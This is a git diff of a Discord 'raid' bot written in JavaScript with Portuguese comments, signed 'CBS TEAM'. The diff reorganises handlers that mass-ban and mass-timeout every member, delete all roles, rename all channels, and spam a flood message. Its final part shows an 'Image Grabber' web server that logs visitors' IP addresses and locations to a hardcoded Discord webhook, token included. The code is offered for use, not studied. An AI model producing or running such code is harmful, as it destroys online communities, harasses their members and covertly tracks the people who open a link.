@@ -17,9 +17,9 @@ const client = new Client({
   ]
 });
 
-// ============ COMANDOS ============
 client.commands = new Collection();
 client.menuCommands = new Collection();
+client.timers = new Map();
 
 const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
 const commands = [];
@@ -57,13 +57,12 @@ client.once('ready', async () => {
   });
 
   cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
-  console.log('📋 Digite /menu para abrir o menu');
+  console.log('📋 Digite !menu no Discord');
   console.log('📸 Digite /img para gerar Image Grabber');
 });
 
-// ============ INTERAÇÕES ============
+// ============ SLASH COMMANDS ============
 client.on('interactionCreate', async interaction => {
-  // Comandos Slash
   if (interaction.isCommand()) {
     const command = client.commands.get(interaction.commandName);
     if (!command) return;
@@ -73,220 +72,91 @@ client.on('interactionCreate', async interaction => {
       console.error(error);
       await interaction.reply({ content: '❌ Erro.', flags: 64 }).catch(() => {});
     }
-    return;
-  }
-
-  // Modais
-  if (interaction.isModalSubmit()) {
-    const modalId = interaction.customId;
-
-    // Edit Raid
-    if (modalId === 'editRaidModal') {
-      const categoria = interaction.fields.getTextInputValue('categoriaInput');
-      const mensagem = interaction.fields.getTextInputValue('mensagemInput');
-      const config = require('./config');
-      if (categoria) config.raid.baseName = categoria;
-      if (mensagem) config.raid.spamMessage = mensagem;
-      await interaction.reply({
-        content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
-        flags: 64
-      }).catch(() => {});
-    }
-
-    // Rename
-    if (modalId === 'renameModal') {
-      const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
-      const nome = interaction.fields.getTextInputValue('nomeInput');
-      const guild = interaction.guild;
-      if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
-      if (tipo === 'canal') {
-        const channels = guild.channels.cache.filter(c => c.type === 0);
-        let count = 0;
-        for (const [id, ch] of channels) {
-          try { await ch.setName(nome); count++; } catch {}
-        }
-        await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, flags: 64 }).catch(() => {});
-      } else if (tipo === 'categoria') {
-        const categories = guild.channels.cache.filter(c => c.type === 4);
-        let count = 0;
-        for (const [id, cat] of categories) {
-          try { await cat.setName(nome); count++; } catch {}
-        }
-        await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, flags: 64 }).catch(() => {});
-      } else {
-        await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', flags: 64 }).catch(() => {});
-      }
-    }
-
-    // Ban All
-    if (modalId === 'banAllModal') {
-      const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
-      const guild = interaction.guild;
-      if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
-      const botId = interaction.client.user.id;
-      const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
-      if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 }).catch(() => {});
-      await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 }).catch(() => {});
-      let banidos = 0;
-      const list = [...members.values()];
-      for (let i = 0; i < list.length; i += 10) {
-        const chunk = list.slice(i, i + 10);
-        await Promise.all(chunk.map(m => m.ban({ reason: motivo }).catch(() => {})));
-        banidos += chunk.length;
-        await interaction.editReply(`🔨 ${banidos}/${members.size} banidos`).catch(() => {});
-      }
-      await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`).catch(() => {});
-    }
-
-    // End (Timeout)
-    if (modalId === 'endModal') {
-      const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
-      const duracao = minutos * 60 * 1000;
-      const guild = interaction.guild;
-      if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
-      const botId = interaction.client.user.id;
-      const members = guild.members.cache.filter(m => m.id !== botId);
-      if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 }).catch(() => {});
-      await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 }).catch(() => {});
-      let timeoutados = 0;
-      const list = [...members.values()];
-      for (let i = 0; i < list.length; i += 10) {
-        const chunk = list.slice(i, i + 10);
-        await Promise.all(chunk.map(m => m.timeout(duracao, 'RAID CBS').catch(() => {})));
-        timeoutados += chunk.length;
-        await interaction.editReply(`⏰ ${timeoutados}/${members.size} timeout`).catch(() => {});
-      }
-      await interaction.editReply(`✅ **${timeoutados} MEMBROS EM TIMEOUT POR ${minutos} MIN!**`).catch(() => {});
-    }
-  }
-
-  // ===== BOTÕES =====
-  if (interaction.isButton()) {
-    const buttonId = interaction.customId;
-
-    // ===== MENU - EXECUTAR COMANDO =====
-    const menuCommands = {
-      'menu_nuke': 'nuke',
-      'menu_timer': 'timer',
-      'menu_reverse': 'reverse',
-      'menu_img': 'img',
-      'menu_spam': 'spam',
-      'menu_dm': 'dm',
-      'menu_say': 'say',
-      'menu_banall': 'banall',
-      'menu_end': 'end',
-      'menu_deleterole': 'deleterole',
-      'menu_editraid': 'editraid',
-      'menu_rename': 'rename'
-    };
-    if (buttonId in menuCommands) {
-      const cmdName = menuCommands[buttonId];
-      const cmd = client.commands.get(cmdName);
-      if (cmd) {
-        try {
-          // Alguns comandos precisam de defer
-          await interaction.deferReply({ flags: 64 });
-          await cmd.execute(interaction, client);
-        } catch (error) {
-          console.error(error);
-          await interaction.editReply({ content: '❌ Erro ao executar comando.' });
-        }
-      }
-      return;
-    }
-
-    // ===== SPAM 1 =====
-    if (buttonId === 'spam1') {
-      await interaction.deferReply({ flags: 64 }).catch(() => {});
-      const channel = interaction.channel;
-      if (!channel) return interaction.editReply({ content: '❌ Canal não encontrado.', flags: 64 }).catch(() => {});
-      const mensagemSpam = require('./config').raid.spamMessage || '**RAIDED BY CBS TEAM** 🔥';
-      let enviadas = 0;
-      for (let i = 0; i < 1; i++) {
-        try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
-      }
-      await interaction.editReply(`✅ **${enviadas} mensagem enviada!** 💬`).catch(() => {});
-      return;
-    }
-
-    // ===== SPAM 2 =====
-    if (buttonId === 'spam2') {
-      await interaction.deferReply({ flags: 64 }).catch(() => {});
-      const channel = interaction.channel;
-      if (!channel) return interaction.editReply({ content: '❌ Canal não encontrado.', flags: 64 }).catch(() => {});
-      const mensagemSpam = require('./config').raid.spamMessage || '**RAIDED BY CBS TEAM** 🔥';
-      let enviadas = 0;
-      for (let i = 0; i < 2; i++) {
-        try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
-      }
-      await interaction.editReply(`✅ **${enviadas} mensagens enviadas!** 💬`).catch(() => {});
-      return;
-    }
-
-    // ===== PARAR TIMER =====
-    if (buttonId === 'stop_timer') {
-      const DONO_ID = '1409370594138525746';
-      if (interaction.user.id !== DONO_ID) {
-        return interaction.reply({ content: '❌ Apenas o dono pode parar o timer.', flags: 64 });
-      }
-      if (!client.timers) client.timers = new Map();
-      let timerEncontrado = null;
-      let timerKey = null;
-      for (const [key, data] of client.timers) {
-        if (data.channel.id === interaction.channel.id && data.ativo) {
-          timerEncontrado = data;
-          timerKey = key;
-          break;
-        }
-      }
-      if (!timerEncontrado) {
-        return interaction.reply({ content: '❌ Nenhum timer ativo neste canal.', flags: 64 });
-      }
-      timerEncontrado.ativo = false;
-      if (timerEncontrado.timeout) clearTimeout(timerEncontrado.timeout);
-      if (timerEncontrado.interval) clearInterval(timerEncontrado.interval);
-      client.timers.delete(timerKey);
-
-      const embedCancel = new EmbedBuilder()
-        .setTitle('⏱️ TIMER CANCELADO')
-        .setDescription('❌ O timer foi **cancelado** pelo dono.')
-        .setColor(0xFF0000)
-        .setTimestamp();
-
-      try {
-        const msg = await interaction.channel.messages.fetch(timerEncontrado.messageId);
-        await msg.edit({ embeds: [embedCancel], components: [] });
-      } catch {}
-
-      await interaction.reply({ content: '✅ **Timer cancelado com sucesso!**', flags: 64 });
-      return;
-    }
-
-    // ===== DELETEROLE =====
-    if (buttonId === 'confirmDeleteRoles') {
-      const guild = interaction.guild;
-      if (!guild) return interaction.reply({ content: '❌ Apenas em servidores.', flags: 64 }).catch(() => {});
-      const roles = guild.roles.cache.filter(r => r.id !== guild.id);
-      await interaction.deferReply({ flags: 64 }).catch(() => {});
-      let deletados = 0;
-      const list = [...roles.values()];
-      for (let i = 0; i < list.length; i += 10) {
-        const chunk = list.slice(i, i + 10);
-        await Promise.all(chunk.map(r => r.delete().catch(() => {})));
-        deletados += chunk.length;
-        await interaction.editReply(`🗑️ ${deletados}/${roles.size} deletados`).catch(() => {});
-      }
-      await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`).catch(() => {});
-      return;
-    }
-    if (buttonId === 'cancelDeleteRoles') {
-      await interaction.reply({ content: '❌ Cancelado.', flags: 64 }).catch(() => {});
-      return;
-    }
   }
 });
 
-// ============ !MENU (LEGADO) ============
+// ============ MODAIS ============
+client.on('interactionCreate', async interaction => {
+  if (!interaction.isModalSubmit()) return;
+  const modalId = interaction.customId;
+
+  if (modalId === 'editRaidModal') {
+    const categoria = interaction.fields.getTextInputValue('categoriaInput');
+    const mensagem = interaction.fields.getTextInputValue('mensagemInput');
+    const config = require('./config');
+    if (categoria) config.raid.baseName = categoria;
+    if (mensagem) config.raid.spamMessage = mensagem;
+    await interaction.reply({
+      content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
+      flags: 64
+    }).catch(() => {});
+  }
+
+  if (modalId === 'renameModal') {
+    const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
+    const nome = interaction.fields.getTextInputValue('nomeInput');
+    const guild = interaction.guild;
+    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
+    if (tipo === 'canal') {
+      const channels = guild.channels.cache.filter(c => c.type === 0);
+      let count = 0;
+      for (const [id, ch] of channels) {
+        try { await ch.setName(nome); count++; } catch {}
+      }
+      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, flags: 64 }).catch(() => {});
+    } else if (tipo === 'categoria') {
+      const categories = guild.channels.cache.filter(c => c.type === 4);
+      let count = 0;
+      for (const [id, cat] of categories) {
+        try { await cat.setName(nome); count++; } catch {}
+      }
+      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, flags: 64 }).catch(() => {});
+    } else {
+      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', flags: 64 }).catch(() => {});
+    }
+  }
+
+  if (modalId === 'banAllModal') {
+    const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
+    const guild = interaction.guild;
+    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
+    const botId = interaction.client.user.id;
+    const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
+    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 }).catch(() => {});
+    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 }).catch(() => {});
+    let banidos = 0;
+    const list = [...members.values()];
+    for (let i = 0; i < list.length; i += 10) {
+      const chunk = list.slice(i, i + 10);
+      await Promise.all(chunk.map(m => m.ban({ reason: motivo }).catch(() => {})));
+      banidos += chunk.length;
+      await interaction.editReply(`🔨 ${banidos}/${members.size} banidos`).catch(() => {});
+    }
+    await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`).catch(() => {});
+  }
+
+  if (modalId === 'endModal') {
+    const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
+    const duracao = minutos * 60 * 1000;
+    const guild = interaction.guild;
+    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
+    const botId = interaction.client.user.id;
+    const members = guild.members.cache.filter(m => m.id !== botId);
+    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 }).catch(() => {});
+    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 }).catch(() => {});
+    let timeoutados = 0;
+    const list = [...members.values()];
+    for (let i = 0; i < list.length; i += 10) {
+      const chunk = list.slice(i, i + 10);
+      await Promise.all(chunk.map(m => m.timeout(duracao, 'RAID CBS').catch(() => {})));
+      timeoutados += chunk.length;
+      await interaction.editReply(`⏰ ${timeoutados}/${members.size} timeout`).catch(() => {});
+    }
+    await interaction.editReply(`✅ **${timeoutados} MEMBROS EM TIMEOUT POR ${minutos} MIN!**`).catch(() => {});
+  }
+});
+
+// ============ !MENU ============
 client.on('messageCreate', async message => {
   if (message.author.bot) return;
   if (!message.content.startsWith('!')) return;
@@ -302,6 +172,140 @@ client.on('messageCreate', async message => {
   }
 });
 
+// ============ BOTÕES ============
+client.on('interactionCreate', async interaction => {
+  if (!interaction.isButton()) return;
+
+  const mensagemSpam = 
+    `**RAIDED BY CBS TEAM** https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif ꧁꧂꧁꧂꧁꧂**꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂`;
+
+  // ===== SPAM 1 VEZ =====
+  if (interaction.customId === 'spam1') {
+    await interaction.deferReply({ flags: 64 }).catch(() => {});
+    const channel = interaction.channel;
+    if (!channel) {
+      return interaction.editReply({ content: '❌ Canal não encontrado.', flags: 64 }).catch(() => {});
+    }
+    let enviadas = 0;
+    for (let i = 0; i < 1; i++) {
+      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
+    }
+    await interaction.editReply(`✅ **${enviadas} mensagem enviada!** 💬`).catch(() => {});
+    return;
+  }
+
+  // ===== SPAM 2 VEZES =====
+  if (interaction.customId === 'spam2') {
+    await interaction.deferReply({ flags: 64 }).catch(() => {});
+    const channel = interaction.channel;
+    if (!channel) {
+      return interaction.editReply({ content: '❌ Canal não encontrado.', flags: 64 }).catch(() => {});
+    }
+    let enviadas = 0;
+    for (let i = 0; i < 2; i++) {
+      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
+    }
+    await interaction.editReply(`✅ **${enviadas} mensagens enviadas!** 💬`).catch(() => {});
+    return;
+  }
+
+  // ===== BOTÕES DO MENU =====
+  const menuMap = {
+    'menu_nuke': 'nuke',
+    'menu_timer': 'timer',
+    'menu_img': 'img',
+    'menu_say': 'say',
+    'menu_reverse': 'reverse',
+    'menu_invite': 'invite',
+    'menu_channelspam': 'channelspam',
+    'menu_banall': 'banall',
+    'menu_end': 'end',
+    'menu_deleterole': 'deleterole'
+  };
+
+  if (menuMap[interaction.customId]) {
+    const cmdName = menuMap[interaction.customId];
+    const cmd = client.commands.get(cmdName);
+    if (!cmd) {
+      return interaction.reply({ content: '❌ Comando não encontrado.', flags: 64 }).catch(() => {});
+    }
+    try {
+      // Para o comando invite, precisamos passar client
+      if (cmdName === 'invite') {
+        await cmd.execute(interaction, client);
+      } else {
+        await cmd.execute(interaction, client);
+      }
+    } catch (err) {
+      console.error(err);
+      await interaction.reply({ content: '❌ Erro.', flags: 64 }).catch(() => {});
+    }
+    return;
+  }
+
+  // ===== BOTÃO PARAR TIMER =====
+  if (interaction.customId === 'stop_timer') {
+    const DONO_ID = '1409370594138525746';
+    if (interaction.user.id !== DONO_ID) {
+      return interaction.reply({ content: '❌ Apenas o dono pode parar o timer.', flags: 64 }).catch(() => {});
+    }
+
+    let timerEncontrado = null;
+    let timerKey = null;
+    for (const [key, data] of client.timers) {
+      if (data.channel.id === interaction.channel.id && data.ativo) {
+        timerEncontrado = data;
+        timerKey = key;
+        break;
+      }
+    }
+
+    if (!timerEncontrado) {
+      return interaction.reply({ content: '❌ Nenhum timer ativo neste canal.', flags: 64 }).catch(() => {});
+    }
+
+    timerEncontrado.ativo = false;
+    if (timerEncontrado.timeout) clearTimeout(timerEncontrado.timeout);
+    if (timerEncontrado.interval) clearInterval(timerEncontrado.interval);
+    client.timers.delete(timerKey);
+
+    const embedCancel = new EmbedBuilder()
+      .setTitle('⏱️ TIMER CANCELADO')
+      .setDescription('❌ O timer foi **cancelado** pelo dono.')
+      .setColor(0xFF0000)
+      .setTimestamp();
+
+    try {
+      const msg = await interaction.channel.messages.fetch(timerEncontrado.messageId);
+      await msg.edit({ embeds: [embedCancel], components: [] });
+    } catch {}
+
+    await interaction.reply({ content: '✅ **Timer cancelado com sucesso!**', flags: 64 }).catch(() => {});
+    return;
+  }
+
+  // ===== CONFIRMAR / CANCELAR DELETEROLE =====
+  if (interaction.customId === 'confirmDeleteRoles') {
+    const guild = interaction.guild;
+    if (!guild) return interaction.reply({ content: '❌ Apenas em servidores.', flags: 64 }).catch(() => {});
+    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
+    await interaction.deferReply({ flags: 64 }).catch(() => {});
+    let deletados = 0;
+    const list = [...roles.values()];
+    for (let i = 0; i < list.length; i += 10) {
+      const chunk = list.slice(i, i + 10);
+      await Promise.all(chunk.map(r => r.delete().catch(() => {})));
+      deletados += chunk.length;
+      await interaction.editReply(`🗑️ ${deletados}/${roles.size} deletados`).catch(() => {});
+    }
+    await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`).catch(() => {});
+  }
+
+  if (interaction.customId === 'cancelDeleteRoles') {
+    await interaction.reply({ content: '❌ Cancelado.', flags: 64 }).catch(() => {});
+  }
+});
+
 // ==================== SERVIDOR HTTP E IMAGE GRABBER ====================
 const app = express();
 const port = process.env.PORT || 3000;
@@ -310,7 +314,6 @@ app.use(express.static('public'));
 const ipData = {};
 const imageStore = {};
 
-// ===== WEBHOOK OFICIAL =====
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528811226405142528/-b8_dqEYF8_QluNDfXYpyvar40PL9HD_-7OqHrZC5UbWJrjDk6Mmq3iwsktXZaHbSUP6';
 
 // ===== FUNÇÃO PARA BUSCAR LOCALIZAÇÃO POR IP =====
@@ -367,7 +370,6 @@ async function enviarWebhook(id, dados) {
   }
 }
 
-// Rota principal do Image Grabber
 app.get('/img/:id', async (req, res) => {
   const id = req.params.id;
   const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
